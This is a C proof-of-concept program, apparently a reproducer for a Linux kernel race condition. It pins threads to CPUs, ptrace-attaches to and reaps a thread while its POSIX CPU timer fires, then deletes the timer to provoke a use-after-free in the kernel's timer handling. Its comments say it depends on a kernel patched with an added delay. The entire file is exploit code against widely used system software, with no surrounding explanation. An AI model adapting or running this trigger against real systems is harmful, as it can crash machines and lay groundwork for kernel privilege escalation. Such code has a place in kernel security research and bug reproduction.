#define _GNU_SOURCE
#include <time.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <stdlib.h>
#include <err.h>
#include <sys/prctl.h>
#include <sched.h>
#include <linux/membarrier.h>
#include <sys/syscall.h>

#define SYSCHK(x) ({            \
    typeof(x) __res = (x);      \
    if (__res == (typeof(x))-1) \
      err(1, "SYSCHK(" #x ")"); \
    __res;                      \
})

void pin_on_cpu(int i) {
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(i, &mask);
    sched_setaffinity(0, sizeof(mask), &mask);
}

void timer_fire(void) {
    prctl(PR_SET_NAME, "TIMER_FIRED");
    printf("Timer fired\n");
}

void wait_for_rcu() {
    syscall(__NR_membarrier, MEMBARRIER_CMD_GLOBAL, 0);
}

pthread_barrier_t barrier;
timer_t timer;
pthread_t reapee_thread;
int c2p[2]; // child to parent
int p2c[2]; // parent to child
long int wait_time = 250000;

void reapee(void) {
    pin_on_cpu(2);
    struct sigevent sev = {0};
    sev.sigev_notify = SIGEV_THREAD;
    sev.sigev_notify_function = (void (*)(sigval_t))timer_fire;
    char m;

    prctl(PR_SET_NAME, "SLOWME");

    // Send this thread's TID to the parent process
    pid_t tid = (pid_t)syscall(SYS_gettid);
    SYSCHK(write(c2p[1], &tid, sizeof(pid_t)));

    printf("Creating timer\n");
    SYSCHK(timer_create(CLOCK_THREAD_CPUTIME_ID, &sev, &timer));
    printf("Timer created\n");

    struct itimerspec ts = {
        .it_interval = {0, 0},
        .it_value = {
            .tv_sec = 0,
            .tv_nsec = wait_time, // Custom wait time
        },
    };

    // Wait for parent to attach
    pthread_barrier_wait(&barrier);

    SYSCHK(timer_settime(timer, 0, &ts, NULL));

    // Use some CPU time to make sure the timer will fire correctly
    for (int i = 0; i < 1000000; i++);

    return;
}

int main(int argc, char *argv[]) {
    // Use a custom wait time to figure out the exact timing when the
    // timer will fire right after `exit_notify()` sets the task's
    // state to EXIT_ZOMBIE.
    if (argc > 1) {
        wait_time = strtol(argv[1], NULL, 10);
        printf("Custom wait time: %ld\n", wait_time);
    }
    // Parent and child setup
    // Use pipes to communicate between parent and child
    SYSCHK(pipe(c2p));
    SYSCHK(pipe(p2c));
    
    pid_t pid = SYSCHK(fork());
    
    if (pid) {
        // parent
        pin_on_cpu(1);
        char m;
        close(c2p[1]);
        close(p2c[0]);

        // Receive child process's REAPEE thread'sTID
        pid_t tid;
        SYSCHK(read(c2p[0], &tid, sizeof(pid_t)));
        printf("Parent: reapee thread ID: %d\n", tid);

        // Attach and continue
        printf("Parent: attaching to REAPEE thread\n");
        SYSCHK(ptrace(PTRACE_ATTACH, tid, NULL, NULL));
        SYSCHK(waitpid(tid, NULL, __WALL));
        SYSCHK(ptrace(PTRACE_CONT, tid, NULL, NULL));

        // Signal to child that we attached and continued
        SYSCHK(write(p2c[1], &m, 1));

        // Reap the REAPEE thread now
        printf("Parent: reaping REAPEE thread\n");
        SYSCHK(waitpid(tid, NULL, __WALL));
        printf("Parent: detached from REAPEE\n");

        // Let the child process know REAPEE is reaped
        SYSCHK(write(p2c[1], &m, 1));

        // Let the child process delete and free the timer
        // before exiting
        SYSCHK(read(c2p[0], &m, 1));
    } else {
        // child
        pin_on_cpu(0);
        char m;
        close(c2p[0]);
        close(p2c[1]);

        prctl(PR_SET_NAME, "CHILD_MAIN");
        pthread_barrier_init(&barrier, NULL, 2);
        pthread_create(&reapee_thread, NULL, (void*)reapee, NULL);

        printf("Thread created\n");

        // Parent process writes to us when attached and continued, use
        // a barrier to continue the REAPEE thread now
        SYSCHK(read(p2c[0], &m, 1));
        pthread_barrier_wait(&barrier);

        // Parent process writes to us when waitpid() returns successfully.
        //
        // At this point, if we won the race, `handle_posix_cpu_timers()` will be in
        // the patched `mdelay(500)` with `tsk->exit_state != 0`, and calling
        // `timer_delete()` should make it see a NULL `sighand`, which will cause it to
        // just free the timer unconditionally.
        SYSCHK(read(p2c[0], &m, 1));
        timer_delete(timer);
        printf("Child: timer deleted\n");

        // Let the timer be freed by RCU, then let the parent process know it can exit
        wait_for_rcu();
        SYSCHK(write(c2p[1], &m, 1));
        pause();
    }
}
